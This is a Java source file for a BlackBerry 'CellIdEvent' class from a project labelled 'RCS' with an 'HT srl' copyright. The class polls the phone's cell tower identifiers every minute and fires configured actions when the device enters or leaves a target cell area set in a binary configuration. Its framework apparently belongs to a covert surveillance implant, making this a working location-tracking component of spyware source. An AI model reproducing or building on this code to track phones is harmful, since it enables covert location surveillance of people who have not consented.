//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CellIdEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class CellIdEvent.
 */
public final class CellIdEvent extends Event {
    private static final long CELLID_PERIOD = 60000;
    private static final long CELLID_DELAY = 1000;
    //#ifdef DEBUG
    private static Debug debug = new Debug("CellIdEvent", DebugLevel.VERBOSE);
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int mccOrig;
    int mncOrig;
    int lacOrig;
    int cidOrig;

    boolean entered = false;

    /**
     * Instantiates a new cell id event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public CellIdEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_CELLID, actionId, confParams, "CellIdEvent");
    }

    protected void actualStart() {
        entered = true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        //final boolean gprs = Device.isGPRS();
        int mcc = 0, mnc = 0, lac = 0, cid = 0;

        if (Device.isGPRS()) {

            final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

            mcc = Integer.parseInt(Integer.toHexString((RadioInfo
                    .getMCC(RadioInfo.getCurrentNetworkIndex()))));
            mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());

            lac = cellinfo.getLAC();
            cid = cellinfo.getCellId();
            // bsic = cellinfo.getBSIC();

            final StringBuffer mb = new StringBuffer();
            mb.append("MCC: " + mcc);
            mb.append(" MNC: " + mnc);
            mb.append(" LAC: " + lac);
            mb.append(" CID: " + cid);
            //#ifdef DEBUG
            debug.info(mb.toString());
            //#endif

        } else if (Device.isCDMA()) {
            final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
            //CDMAInfo.getIMSI()
            final int sid = cellinfo.getSID();
            final int nid = cellinfo.getNID();
            final int bid = cellinfo.getBID();
            //https://www.blackberry.com/jira/browse/JAVAAPI-641
            mcc = RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex());

            final StringBuffer mb = new StringBuffer();
            mb.append("SID: " + sid);
            mb.append(" NID: " + nid);
            mb.append(" BID: " + bid);

            //#ifdef DEBUG
            debug.info(mb.toString());
            //#endif

            mnc = sid;
            lac = nid;
            cid = bid;
        } else if (Device.isIDEN()) {
            //#ifdef DEBUG
            debug.error("actualRun: IDEN not supported");
            //#endif
            return;
        }

        if ((mccOrig == -1 || mccOrig == mcc)
                && (mncOrig == -1 || mncOrig == mnc)
                && (lacOrig == -1 || lacOrig == lac)
                && (cidOrig == -1 || cidOrig == cid)) {
            if (!entered) {
                //#ifdef DEBUG
                debug.info("Enter");
                //#endif
                entered = true;
                trigger(actionOnEnter);
            } else {
                //#ifdef DEBUG
                debug.trace("already entered");
                //#endif
            }

        } else {
            if (entered) {
                //#ifdef DEBUG
                debug.info("Exit");
                //#endif
                entered = false;
                trigger(actionOnExit);
            } else {
                //#ifdef DEBUG
                debug.trace("already exited");
                //#endif
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            mccOrig = databuffer.readInt();
            mncOrig = databuffer.readInt();
            lacOrig = databuffer.readInt();
            cidOrig = databuffer.readInt();

            //#ifdef DEBUG
            debug.info("Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
                    + lacOrig + " Cid: " + cidOrig);
            //#endif

            setPeriod(CELLID_PERIOD);
            setDelay(CELLID_DELAY);

        } catch (final EOFException e) {
            return false;
        }

        return true;
    }

}
